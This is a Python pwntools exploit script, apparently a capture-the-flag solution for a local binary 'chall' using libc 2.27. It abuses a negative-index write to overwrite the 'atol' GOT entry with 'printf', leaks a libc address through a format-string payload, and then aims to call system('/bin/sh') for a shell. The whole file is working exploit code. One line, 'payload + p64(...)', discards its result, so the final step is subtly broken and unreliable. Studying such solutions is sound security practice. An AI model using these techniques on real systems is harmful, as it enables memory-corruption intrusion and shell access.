from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')
io = process(elf.path)
context.binary = elf
offset = libc.symbols[b'__libc_start_main'] + 231

io.sendlineafter(b'index: ', b'-2')
io.sendlineafter(b'value: ', str(elf.got['atol'] - 0x8).encode())

io.sendlineafter(b'index: ', b'a'*8 + p64(elf.sym['printf']))

io.sendlineafter(b'value: ', b'%25$p')

leak_addr = int(io.recv(14), 16)
libc.address = leak_addr - offset
log.info('libc base: ' + hex(libc.address))

payload = b'/bin/sh\x00'
payload + p64(libc.symbols['system'])
io.sendlineafter(b'index: ', payload)

io.interactive()

